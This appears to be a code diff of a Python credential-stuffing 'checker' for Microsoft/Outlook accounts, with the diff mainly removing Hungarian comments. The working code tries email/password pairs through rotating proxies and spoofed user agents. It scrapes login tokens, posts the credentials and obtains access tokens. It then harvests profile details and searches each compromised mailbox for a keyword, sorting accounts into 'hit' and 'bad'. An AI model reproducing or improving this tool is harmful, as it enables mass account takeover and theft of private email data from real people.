@@ -8,8 +8,8 @@ from proxy_manager import proxy_manager
 
 _ua = UserAgent()
 
-PROXY_RETRIES = 3    # Ennyi proxyval próbálja
-DIRECT_FALLBACK = True  # Ha proxy nem megy → proxy nélkül
+PROXY_RETRIES = 3
+DIRECT_FALLBACK = True
 
 
 def generate_user_agent():
@@ -20,13 +20,6 @@ def generate_user_agent():
 
 
 def checker_worker_single(email: str, password: str, keyword: str):
-    """
-    1. Próbálja proxyval (max PROXY_RETRIES alkalommal)
-    2. Ha mind fail → próbálja PROXY NÉLKÜL (direct)
-    3. Soha nem jelöl bad-nek proxy hiba miatt!
-    """
-
-    # ===== 1. FÁZIS: Proxyval próbáljuk =====
     if proxy_manager.get_count() > 0:
         for attempt in range(PROXY_RETRIES):
             proxy_dict = proxy_manager.get_proxy()
@@ -36,12 +29,8 @@ def checker_worker_single(email: str, password: str, keyword: str):
 
             try:
                 result = _do_check(session, email, password, keyword)
-
-                # Végleges eredmény → visszaadjuk
                 if result["status"] in ("hit", "custom", "bad"):
                     return result
-
-                # Proxy hiba → következő proxy
             except Exception:
                 pass
             finally:
@@ -49,7 +38,6 @@ def checker_worker_single(email: str, password: str, keyword: str):
 
             time.sleep(0.05)
 
-    # ===== 2. FÁZIS: Direct (proxy nélkül) =====
     if DIRECT_FALLBACK:
         session = requests.Session()
         try:
@@ -60,23 +48,13 @@ def checker_worker_single(email: str, password: str, keyword: str):
         finally:
             session.close()
 
-    return {"status": "error", "reason": "All proxies failed, no fallback"}
+    return {"status": "error", "reason": "All proxies failed"}
 
 
 def _do_check(session, email, password, keyword):
-    """
-    A tényleges ellenőrzési logika.
-
-    Visszatérés:
-    - "bad"    → Microsoft elutasította (rossz jelszó / nem létezik)
-    - "hit"    → Talált emailt
-    - "custom" → Bejelentkezett de nincs találat
-    - "error"  → Hálózati/proxy hiba → RETRY másik proxyval
-    """
     try:
         user_agent = generate_user_agent()
 
-        # ============ STEP 1: GET login page ============
         url = (
             "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
             f"client_info=1&haschrome=1&login_hint={email}"
@@ -110,14 +88,12 @@ def _do_check(session, email, password, keyword):
         response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
         response_text = response.text
 
-        # ============ PROXY ELLENŐRZÉS ============
         if len(response_text) < 1000:
             return {"status": "error", "reason": "Response too short"}
 
         if "PPFT" not in response_text and "urlPost" not in response_text and "login.live.com" not in response_text:
             return {"status": "error", "reason": "Not Microsoft page"}
 
-        # ============ STEP 2: Parse PPFT & urlPost ============
         PPFT = ""
         urlPost = ""
 
@@ -153,10 +129,8 @@ def _do_check(session, email, password, keyword):
                 urlPost = urlpost_match.group(1)
 
         if not PPFT or not urlPost:
-            # Microsoft oldalt kaptunk de nincs PPFT → valódi bad (fiók nem létezik)
             return {"status": "bad", "reason": "No PPFT/urlPost"}
 
-        # ============ STEP 3: POST credentials ============
         cookies_dict = session.cookies.get_dict()
         MSPRequ = cookies_dict.get('MSPRequ', '')
         uaid_cookie = cookies_dict.get('uaid', '')
@@ -206,11 +180,9 @@ def _do_check(session, email, password, keyword):
 
         cookies_dict = session.cookies.get_dict()
 
-        # ============ AUTH ELLENŐRZÉS ============
         if "__Host-MSAAUTHP" not in cookies_dict:
             return {"status": "bad", "reason": "Wrong password"}
 
-        # ============ STEP 4: Extract auth code ============
         auth_code = ""
         if post_response.status_code in [301, 302, 303, 307, 308]:
             redirect_url = post_response.headers.get('Location', '')
@@ -228,7 +200,6 @@ def _do_check(session, email, password, keyword):
         if CID:
             CID = CID.upper()
 
-        # ============ STEP 5: Get access token ============
         access_token = ""
         if auth_code:
             url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
@@ -255,7 +226,6 @@ def _do_check(session, email, password, keyword):
         if not access_token or not CID:
             return {"status": "bad", "reason": "No token"}
 
-        # ============ STEP 6: Profile ============
         Name = ""
         Country = ""
         Birthdate = "N/A"
@@ -293,7 +263,6 @@ def _do_check(session, email, password, keyword):
         except:
             pass
 
-        # ============ STEP 7: Email search ============
         search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
         search_payload = {
             "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
@@ -379,7 +348,6 @@ def _do_check(session, email, password, keyword):
         except:
             pass
 
-        # ============ STEP 8: Results ============
         if Total != "0" and Total != "NO":
             return {
                 "status": "hit",
